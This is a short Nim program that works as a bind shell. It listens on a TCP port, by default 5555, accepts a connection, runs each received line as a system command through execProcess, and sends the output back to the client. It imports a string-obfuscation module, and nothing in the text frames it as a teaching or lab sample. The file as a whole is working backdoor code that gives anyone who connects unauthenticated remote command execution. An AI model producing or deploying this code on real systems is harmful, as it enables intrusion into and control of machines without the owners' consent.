import net
import osproc
import os
import strutils
import strenc

var port = 5555
var args = commandLineParams()
if args.len() == 1:
  port = parseInt(args[0])

let server: Socket = newSocket()
server.setSockOpt(OptReuseAddr, true)
server.bindAddr(Port(port))
server.listen()
stdout.writeLine("Server: started. Listening to new connections on port ", port, "...")

var client: Socket = new(Socket)
server.accept(client)
stdout.writeLine("Server: client connected")
while true:
  try:
    let command: string = client.recvLine()
    if command == "":
      break
    stdout.writeLine("Server: received from client: \n\t", command)
    var result = execProcess(command)
    client.send(result & "\r\L")

  except:
    echo "Connection lost, quitting..."
    server.close()
    system.quit(0)


server.close()
